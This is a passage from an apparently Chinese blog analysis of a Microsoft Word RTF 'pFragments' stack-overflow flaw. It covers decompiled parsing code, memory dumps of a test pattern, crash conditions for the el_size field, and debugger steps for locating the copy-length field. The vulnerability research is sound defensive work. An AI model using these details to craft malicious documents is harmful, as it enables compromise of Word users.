class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">sub_31FD724E</span><span class="params">(<span class="keyword">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    _BYTE *temp_ptr; <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">int</span> el_size_ptr; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> el_size; <span class="comment">// edi</span></span><br><span class="line">    <span class="keyword">int</span> el_count_ptr; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> byte_num; <span class="comment">// eax</span></span><br><span class="line">    HGLOBAL mem_ptr; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> index; <span class="comment">// edi</span></span><br><span class="line">    <span class="keyword">char</span> *mem_lock_ptr; <span class="comment">// edx</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int8 chr_hex; <span class="comment">// cl</span></span><br><span class="line">    <span class="keyword">char</span> chr; <span class="comment">// cl</span></span><br><span class="line">    <span class="keyword">char</span> new_char; <span class="comment">// al</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int8 chr_hex1; <span class="comment">// cl</span></span><br><span class="line">    _BYTE *group_part_ptr2; <span class="comment">// edi</span></span><br><span class="line">    _BYTE *group_part_ptr; <span class="comment">// ecx</span></span><br><span class="line">    <span class="keyword">char</span> current_char; <span class="comment">// al</span></span><br><span class="line">    <span class="keyword">int</span> count1; <span class="comment">// edi</span></span><br><span class="line">    _BYTE *array_element_ptr1; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> count; <span class="comment">// edi</span></span><br><span class="line">    _BYTE *array_element_ptr; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> case_num; <span class="comment">// [esp+Ch] [ebp-64h]</span></span><br><span class="line">    <span class="keyword">int</span> group_part_value1; <span class="comment">// [esp+38h] [ebp-38h]</span></span><br><span class="line">    <span class="keyword">int</span> group_part_value2; <span class="comment">// [esp+3Ch] [ebp-34h]</span></span><br><span class="line">    <span class="keyword">int</span> array_element_value; <span class="comment">// [esp+40h] [ebp-30h]</span></span><br><span class="line">    <span class="keyword">int</span> array_element_value1; <span class="comment">// [esp+44h] [ebp-2Ch]</span></span><br><span class="line">    <span class="keyword">int</span> Src; <span class="comment">// [esp+48h] [ebp-28h]</span></span><br><span class="line">    LPCVOID pMem; <span class="comment">// [esp+54h] [ebp-1Ch]</span></span><br><span class="line">    _BYTE *group_part_ptr1; <span class="comment">// [esp+60h] [ebp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> *count2; <span class="comment">// [esp+64h] [ebp-Ch]</span></span><br><span class="line">    <span class="keyword">int</span> *key_object; <span class="comment">// [esp+68h] [ebp-8h]</span></span><br><span class="line">    LPSTREAM el_count; <span class="comment">// [esp+6Ch] [ebp-4h]</span></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    result = (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *, <span class="keyword">int</span>, <span class="keyword">int</span> *))(v44 + <span class="number">344</span>))(v42, v43, &amp;case_num); <span class="comment">// sub_329202C7,result = 1</span></span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    result = case_num; <span class="comment">//case_num = 6</span></span><br><span class="line">    <span class="keyword">switch</span> ( case_num )</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            temp_ptr = (_BYTE *)*((_DWORD *)v39 + <span class="number">0x1D9D</span>);</span><br><span class="line">            el_size_ptr = *((_DWORD *)v39 + <span class="number">0x1D9D</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            ......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 6;5;11111111</span></span><br><span class="line">    <span class="keyword">while</span> ( *temp_ptr != <span class="string">';'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !*++temp_ptr )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    &#125;</span><br><span class="line">    *temp_ptr++ = <span class="number">0</span>;</span><br><span class="line">LABEL_25:</span><br><span class="line">    el_size = sub_31BAF3C6(el_size_ptr); <span class="comment">//判断pFragments的属性数组参数是否合法，合法则由字符转为整型,el_size = 6</span></span><br><span class="line">    el_count_ptr = (<span class="keyword">int</span>)temp_ptr;</span><br><span class="line">    <span class="keyword">while</span> ( *temp_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *temp_ptr == <span class="string">';'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            *temp_ptr++ = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++temp_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    el_count = (LPSTREAM)sub_31BAF3C6(el_count_ptr); <span class="comment">//判断pFragments的属性数组参数是否合法，合法则由字符转为整型,el_count = 5</span></span><br><span class="line">    <span class="comment">// 如果el_size为0,MSO_379-&gt;MSO_501-&gt;sub_32608E17-&gt;sub_32608E81中的"32608EAE div ecx"会出错</span></span><br><span class="line">    <span class="comment">// el_size被当做"div ecx"中的除数(ecx)</span></span><br><span class="line">    result = MSO_379(el_size, &amp;key_object);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    <span class="comment">// el_size如果为2,4,8会进行额外处理，非2,4,8则不会处理</span></span><br><span class="line">    <span class="keyword">switch</span> ( el_size )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count &lt;= <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                array_element_ptr = temp_ptr;</span><br><span class="line">                <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( !*temp_ptr )</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">                    <span class="keyword">if</span> ( *temp_ptr == <span class="string">';'</span> )</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    ++temp_ptr;</span><br><span class="line">                &#125;</span><br><span class="line">                *temp_ptr++ = <span class="number">0</span>;</span><br><span class="line">        LABEL_88:</span><br><span class="line">                array_element_value = (<span class="keyword">unsigned</span> __int16)sub_32046D00(array_element_ptr); <span class="comment">// 10进制字符串转化为10进制整型值</span></span><br><span class="line">                <span class="keyword">if</span> ( !(*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *, <span class="keyword">int</span> *, <span class="keyword">int</span>))(*key_object + <span class="number">12</span>))(key_object, &amp;array_element_value, count) )</span><br><span class="line">                    <span class="keyword">return</span> (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *))(*key_object + <span class="number">4</span>))(key_object);</span><br><span class="line">                <span class="keyword">if</span> ( ++count &gt;= (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            count1 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count &lt;= <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                array_element_ptr1 = temp_ptr;</span><br><span class="line">                <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( !*temp_ptr )</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_79;</span><br><span class="line">                    <span class="keyword">if</span> ( *temp_ptr == <span class="string">';'</span> )</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    ++temp_ptr;</span><br><span class="line">                &#125;</span><br><span class="line">                *temp_ptr++ = <span class="number">0</span>;</span><br><span class="line">        LABEL_79:</span><br><span class="line">                array_element_value1 = sub_32046D00(array_element_ptr1);</span><br><span class="line">                <span class="keyword">if</span> ( !(*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *, <span class="keyword">int</span> *, <span class="keyword">int</span>))(*key_object + <span class="number">12</span>))(key_object, &amp;array_element_value1, count1) )</span><br><span class="line">                    <span class="keyword">return</span> (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *))(*key_object + <span class="number">4</span>))(key_object);</span><br><span class="line">                <span class="keyword">if</span> ( ++count1 &gt;= (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:             <span class="comment">// 当el_size为8时，为一组两个数字，如：(0,100)</span></span><br><span class="line">            group_part_ptr2 = <span class="number">0</span>;</span><br><span class="line">            group_part_ptr1 = <span class="number">0</span>;</span><br><span class="line">            count2 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count &lt;= <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            <span class="keyword">while</span> ( !*temp_ptr )</span><br><span class="line">            &#123;</span><br><span class="line">            LABEL_72:</span><br><span class="line">                group_part_value1 = sub_32046D00(group_part_ptr1);</span><br><span class="line">                group_part_value2 = sub_32046D00(group_part_ptr2);</span><br><span class="line">                <span class="keyword">if</span> ( !(*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *, <span class="keyword">int</span> *, <span class="keyword">int</span> *))(*key_object + <span class="number">12</span>))(key_object, &amp;group_part_value1, count2) )</span><br><span class="line">                    <span class="keyword">return</span> (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *))(*key_object + <span class="number">4</span>))(key_object);</span><br><span class="line">                count2 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)count2 + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)count2 &gt;= (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            &#125;</span><br><span class="line">            group_part_ptr = temp_ptr + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                current_char = *temp_ptr;</span><br><span class="line">                <span class="keyword">if</span> ( *temp_ptr == <span class="string">';'</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    *temp_ptr++ = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_72;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( current_char == <span class="string">'('</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    group_part_ptr1 = group_part_ptr;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( current_char == <span class="string">','</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        group_part_ptr2 = group_part_ptr;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> ( current_char != <span class="string">')'</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_71;</span><br><span class="line">                    &#125;</span><br><span class="line">                    *temp_ptr = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        LABEL_71:</span><br><span class="line">                ++temp_ptr;</span><br><span class="line">                ++group_part_ptr;</span><br><span class="line">                <span class="keyword">if</span> ( !*temp_ptr )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_72;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    byte_num = MSO_294(temp_ptr);                 <span class="comment">// 计算pFragments属性值字节数，"11111111acc8....feff61&#125;&#125;&#125;"不算括号</span></span><br><span class="line">    count2 = (<span class="keyword">int</span> *)byte_num;</span><br><span class="line">    mem_ptr = GlobalAlloc(<span class="number">0x40</span>u, (byte_num + <span class="number">1</span>) / <span class="number">2</span>); <span class="comment">// 分配内存</span></span><br><span class="line">    index = <span class="number">0</span>;</span><br><span class="line">    mem_lock_ptr = (<span class="keyword">char</span> *)GlobalLock(mem_ptr);</span><br><span class="line">    pMem = mem_lock_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)count2 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    <span class="comment">// rtf中数据是以16进制形式存储的，这里将16进制数据转化为字符</span></span><br><span class="line">    <span class="comment">// 如：3431 3631 -&gt; 41 61</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( pFragments_value[index] &lt; (<span class="keyword">unsigned</span> __int8)<span class="string">'0'</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">        *mem_lock_ptr = <span class="number">0</span>;</span><br><span class="line">        chr_hex = pFragments_value[index];</span><br><span class="line">        <span class="keyword">if</span> ( chr_hex &gt;= <span class="string">'0'</span> &amp;&amp; chr_hex &lt;= <span class="string">'9'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            chr = chr_hex - <span class="string">'0'</span>;</span><br><span class="line">LABEL_36:</span><br><span class="line">            *mem_lock_ptr = chr;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( chr_hex &gt;= <span class="string">'a'</span> &amp;&amp; chr_hex &lt;= <span class="string">'f'</span> )     <span class="comment">// 字母小写转大写</span></span><br><span class="line">        &#123;</span><br><span class="line">            chr = (chr_hex | <span class="string">' '</span>) - <span class="number">87</span>;             <span class="comment">// 'a'-&gt;A(int)</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_37:</span><br><span class="line">        *mem_lock_ptr *= <span class="number">16</span>;        <span class="comment">// 左移4位</span></span><br><span class="line">        new_char = *mem_lock_ptr;   <span class="comment">// 当前字符作为16进制高4位字符</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">            ++index;</span><br><span class="line">        <span class="keyword">while</span> ( pFragments_value[index] &lt; (<span class="keyword">unsigned</span> __int8)<span class="string">'0'</span> &amp;&amp; index &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)count2 );</span><br><span class="line">        chr_hex1 = pFragments_value[index];</span><br><span class="line">        <span class="keyword">if</span> ( chr_hex1 &lt; <span class="string">'0'</span> || chr_hex1 &gt; <span class="string">'9'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( chr_hex1 &gt;= <span class="string">'a'</span> &amp;&amp; chr_hex1 &lt;= <span class="string">'f'</span> )               <span class="comment">// 字母小写转大写</span></span><br><span class="line">                *mem_lock_ptr = new_char + (chr_hex1 | <span class="string">' '</span>) - <span class="number">87</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            *mem_lock_ptr = chr_hex1 + new_char - <span class="string">'0'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++mem_lock_ptr;</span><br><span class="line">LABEL_44:</span><br><span class="line">        ++index;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( index &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)count2 );</span><br><span class="line">    v39 = group_part_ptr1;</span><br><span class="line">LABEL_46:</span><br><span class="line">    v17 = GlobalHandle(pMem);                     <span class="comment">// 与GlobalLock作用相反</span></span><br><span class="line">    CreateStreamOnHGlobal(v17, <span class="number">1</span>, &amp;el_count);</span><br><span class="line">    (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span> *, LPSTREAM))(*key_object + <span class="number">0x38</span>))(key_object, el_count);</span><br><span class="line">    el_count-&gt;lpVtbl-&gt;Release(el_count);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过对<code>sub_31FD724E</code>函数的伪代码分析可知，Word在解析完<code>“pFragments”</code>属性值数组参数<code>el_size</code>后，会利用一个<code>switch-case</code>语句对<code>el_size</code>的值进行判断，如果为<code>2,4,8</code>会进行额外处理，<code>非2,4,8</code>则默认不会处理。而如果为<code>0</code>的话，会在<code>MSO_379</code>-&gt;<code>MSO_501</code>-&gt;<code>sub_32608E17</code>-&gt;<code>sub_32608E81</code>中的<code>&quot;32608EAE div ecx&quot;</code>处出错，<code>el_size</code>被当做”div ecx”中的<code>除数</code>(ecx)，造成<code>除数为0</code>的错误。</p><p>&emsp;&emsp;继续往下执行，Word会对<code>“pFragments”</code>属性值<code>数组参数</code>后面的数据进行处理。在<code>RTF</code>中，字符<code>“A”</code>是以其16进制值<code>“41”</code>的16进制值<code>“3431”</code>进行存储的，所以<code>Word</code>会对<code>RTF</code>文档中的数据进行一次转化，<code>转化过程</code>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Address   0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F   ASCII</span><br><span class="line">023A0004  31 31 31 31 31 31 31 31 61 63 63 38 34 31 36 31  11111111acc84161</span><br><span class="line">023A0014  33 30 34 31 36 31 33 31 34 31 36 31 33 32 34 31  3041613141613241</span><br><span class="line">023A0024  36 31 33 33 34 31 36 31 33 34 34 31 36 31 33 35  6133416134416135</span><br><span class="line">023A0034  34 31 36 31 33 36 34 31 36 31 33 37 34 31 36 31  4161364161374161</span><br><span class="line">023A0044  33 38 34 31 36 31 33 39 34 31 36 32 33 30 34 31  3841613941623041</span><br><span class="line">023A0054  36 32 33 31 34 31 36 32 33 32 34 31 36 32 33 33  6231416232416233</span><br><span class="line">023A0064  34 31 36 32 33 34 34 31 36 32 33 35 34 31 36 32  4162344162354162</span><br><span class="line">023A0074  33 36 34 31 36 32 33 37 34 31 36 32 33 38 34 31  3641623741623841</span><br><span class="line">023A0084  36 32 33 39 34 31 36 33 33 30 34 31 36 33 33 31  6239416330416331</span><br><span class="line">023A0094  34 31 36 33 33 32 34 31 36 33 33 33 34 31 36 33  4163324163334163</span><br><span class="line">023A00A4  33 34 34 31 36 33 33 35 34 31 36 33 33 36 34 31  3441633541633641</span><br><span class="line">023A00B4  36 33 33 37 34 31 36 33 33 38 34 31 36 33 33 39  6337416338416339</span><br><span class="line">        |       |                                   |       |</span><br><span class="line">        ↓       ↓                                   ↓       ↓</span><br><span class="line">Address   0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F   ASCII</span><br><span class="line">003AFF68  11 11 11 11 AC C8 41 61 30 41 61 31 41 61 32 41  Aa0Aa1Aa2A</span><br><span class="line">003AFF78  61 33 41 61 34 41 61 35 41 61 36 41 61 37 41 61  a3Aa4Aa5Aa6Aa7Aa</span><br><span class="line">003AFF88  38 41 61 39 41 62 30 41 62 31 41 62 32 41 62 33  8Aa9Ab0Ab1Ab2Ab3</span><br><span class="line">003AFF98  41 62 34 41 62 35 41 62 36 41 62 37 41 62 38 41  Ab4Ab5Ab6Ab7Ab8A</span><br><span class="line">003AFFA8  62 39 41 63 30 41 63 31 41 63 32 41 63 33 41 63  b9Ac0Ac1Ac2Ac3Ac</span><br><span class="line">003AFFB8  34 41 63 35 41 63 36 41 63 37 41 63 38 41 63 39  4Ac5Ac6Ac7Ac8Ac9</span><br><span class="line">003AFFC8  41 64 30 41 64 31 41 64 32 41 64 33 41 64 34 41  Ad0Ad1Ad2Ad3Ad4A</span><br><span class="line">003AFFD8  64 35 41 64 36 41 64 37 41 64 38 41 64 39 41 65  d5Ad6Ad7Ad8Ad9Ae</span><br><span class="line">003AFFE8  30 41 65 31 41 65 32 41 65 33 41 65 34 41 65 35  0Ae1Ae2Ae3Ae4Ae5</span><br><span class="line">003AFFF8  41 65 36 41 65 37 41 65 38 41 65 39 41 66 30 41  Ae6Ae7Ae8Ae9Af0A</span><br><span class="line">003B0008  66 31 41 66 32 41 66 33 41 66 34 41 66 35 41 66  f1Af2Af3Af4Af5Af</span><br><span class="line">003B0018  36 41 66 37 41 66 38 41 66 39 41 67 30 41 67 31  6Af7Af8Af9Ag0Ag1</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;经过测试<code>“pFragments”</code>属性值数组参数中的<code>el_size</code>可以是除了<code>“0,2,4,8”</code>之外的任何<code>10进制正整数</code>，如果为<code>“0,2,4,8”</code>中的任意一个，都会造成<code>Word奔溃</code>。而<code>el_count</code>则无限制，任何<code>10进制整数</code>都可以，<code>负的</code>也行。</p><h3 id="0x34-pFragments属性数据中“11111111acc8”的含义"><a href="#0x34-pFragments属性数据中“11111111acc8”的含义" class="headerlink" title="0x34 pFragments属性数据中“11111111acc8”的含义"></a>0x34 pFragments属性数据中“11111111acc8”的含义</h3><p><strong><code>环境：</code></strong>Win7&amp;Office2007</p><p>&emsp;&emsp;前面我们已经知道<code>“11111111acc8”</code>中的<code>“acc8”</code>为Word将<code>pFragments属性数据</code>复制到<code>栈</code>上的<code>数据长度</code>，可是为什么要<code>偏移8字节</code>呢，这8字节有什么<code>限制</code>吗？这些都是要搞清楚的。</p><p>&emsp;&emsp;从前面<code>对奔溃原因溯源</code>的调试中可以知道，复制数据长度<code>“0xc8ac”</code>是从<code>关键对象</code>(0x066a55e0)的<code>成员变量</code>中取出的，所以，我们知道对其下<code>内存写断点</code>，就可以断在<code>对此成员变量赋值</code>的位置，也就是对<code>“11111111acc8”</code>进行解析的代码处。</p><p><strong><code>找关键位置所用方法：</code></strong></p><blockquote><ul><li>1、在<code>Attach</code>目标程序后，对<code>0x066a55e0</code>对象的<code>第4个dword</code>下<code>内存写断点</code>(<code>0x066a55ec</code>为复制长度<code>0xc8ac</code>所在对象成员变量的内存地址)。</li><li>2、再运行程序，如果已经执行到之前<code>调试奔溃时</code>代码区域的最顶层函数<code>sub_32E5955E</code>,还未断下来，则关闭调试器，重新<code>再来一遍</code>。</li><li>3、直到某一次程序对<code>关键对象</code>的地址分配到<code>0x066a55e0</code>，则会断在对<code>关键对象</code>初始化的位置，这时注意OllyDbg的信息窗口中的信息，是否是对关键对象<code>0x066a55e0</code>的<code>第4个dword</code>赋值复制数据长度“0xc8ac”，如果是，则已经定位到解析<code>“11111111acc8”</code>的代码处。</li><li>4、然后根据<code>调用堆栈</code>，可以找到<code>当前函数地址</code>，以及当前函数的<code>调用地址</code>，及其<code>父函数</code>等等。</li></ul></blockquote><p>&emsp;&emsp;如此，我们已经找到解析<code>“11111111acc8”</code>的代码片段。<code>“acc8”</code>偏移<code>8字节</code>的原因以及<code>这8字节</code>是否有什么<code>限制</code>的代码应该就在附近，我们对找到的代码片段<code>详细分析</code>，画<code>“&lt;----”</code>的为关键位置，处理后的结果如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 